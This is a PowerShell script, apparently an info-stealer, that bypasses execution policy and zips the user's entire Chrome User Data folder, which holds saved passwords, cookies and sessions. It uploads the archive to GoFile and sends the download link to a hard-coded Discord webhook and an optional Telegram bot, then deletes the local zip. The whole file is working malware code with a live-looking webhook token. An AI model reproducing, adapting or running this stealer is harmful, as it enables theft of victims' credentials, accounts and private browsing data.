# Ensure execution policy is bypassed
Set-ExecutionPolicy Bypass -Scope Process -Force

# Created by mrproxy
$botToken = "your-telegram-bot-token"   # Replace with your Telegram bot token
$chatID = "your-chat-id"               # Replace with your Telegram chat ID
$webhook = "https://discord.com/api/webhooks/1337216489618542663/z9sFeu7hQPxBUEZ81XN_CHsT3eOSQnAV7XraeCcMJFrkYugTolNcnztAnLbiq516mTB0"  # Replace with your Discord Webhook URL

# Debug log file
$logFile = "$env:TEMP\debug_log.txt"

# Function for sending messages through Telegram Bot
function Send-TelegramMessage {
    param (
        [string]$message
    )

    if ($botToken -and $chatID) {
        $uri = "https://api.telegram.org/bot$botToken/sendMessage"
        $body = @{
            chat_id = $chatID
            text = $message
        }

        try {
            Invoke-RestMethod -Uri $uri -Method Post -Body ($body | ConvertTo-Json) -ContentType 'application/json'
            Add-Content -Path $logFile -Value "Message sent to Telegram: $message"
        } catch {
            Add-Content -Path $logFile -Value "Failed to send message to Telegram: $_"
        }
    } else {
        Send-DiscordMessage -message $message
    }
}

# Function for sending messages through Discord Webhook
function Send-DiscordMessage {
    param (
        [string]$message
    )

    $body = @{
        content = $message
    }

    try {
        Invoke-RestMethod -Uri $webhook -Method Post -Body ($body | ConvertTo-Json) -ContentType 'application/json'
        Add-Content -Path $logFile -Value "Message sent to Discord: $message"
    } catch {
        Add-Content -Path $logFile -Value "Failed to send message to Discord: $_"
    }
}

# Function to upload file and get download link
function Upload-FileAndGetLink {
    param (
        [string]$filePath
    )

    # Get URL from GoFile
    $serverResponse = Invoke-RestMethod -Uri 'https://api.gofile.io/getServer'
    if ($serverResponse.status -ne "ok") {
        Add-Content -Path $logFile -Value "Failed to get server URL: $($serverResponse.status)"
        return $null
    }

    # Define the upload URI
    $uploadUri = "https://$($serverResponse.data.server).gofile.io/uploadFile"

    # Prepare the file for uploading
    try {
        $response = Invoke-RestMethod -Uri $uploadUri -Method Post -InFile $filePath -ContentType "multipart/form-data"
        if ($response.status -ne "ok") {
            Add-Content -Path $logFile -Value "Failed to upload file: $($response.status)"
            return $null
        }

        Add-Content -Path $logFile -Value "File uploaded successfully: $($response.data.downloadPage)"
        return $response.data.downloadPage
    } catch {
        Add-Content -Path $logFile -Value "Failed to upload file: $_"
        return $null
    }
}

# Check for 7zip path
$zipExePath = "C:\Program Files\7-Zip\7z.exe"
if (-not (Test-Path $zipExePath)) {
    $zipExePath = "C:\Program Files (x86)\7-Zip\7z.exe"
}

# Check for Chrome user data path
$chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data"
if (-not (Test-Path $chromePath)) {
    Send-DiscordMessage -message "Chrome User Data path not found!"
    Add-Content -Path $logFile -Value "Chrome User Data path not found!"
    exit
}

# Exit if 7zip is not found
if (-not (Test-Path $zipExePath)) {
    Send-DiscordMessage -message "7-Zip path not found!"
    Add-Content -Path $logFile -Value "7-Zip path not found!"
    exit
}

# Create a zip of the Chrome User Data
$outputZip = "$env:TEMP\chrome_data.zip"
& $zipExePath a -r $outputZip $chromePath
if ($LASTEXITCODE -ne 0) {
    Send-DiscordMessage -message "Error creating zip file with 7-Zip"
    Add-Content -Path $logFile -Value "Error creating zip file with 7-Zip"
    exit
}

# Upload the file and get the link
$link = Upload-FileAndGetLink -filePath $outputZip

# Send the download link
if ($link -ne $null) {
    Send-DiscordMessage -message "Download link: $link"
    Send-TelegramMessage -message "Download link: $link"
    Add-Content -Path $logFile -Value "Download link sent: $link"
} else {
    Send-DiscordMessage -message "Failed to upload file to GoFile.io"
    Add-Content -Path $logFile -Value "Failed to upload file to GoFile.io"
}

# Remove the zip file after uploading
Remove-Item $outputZip -Force
Add-Content -Path $logFile -Value "Deleted zip file after upload."
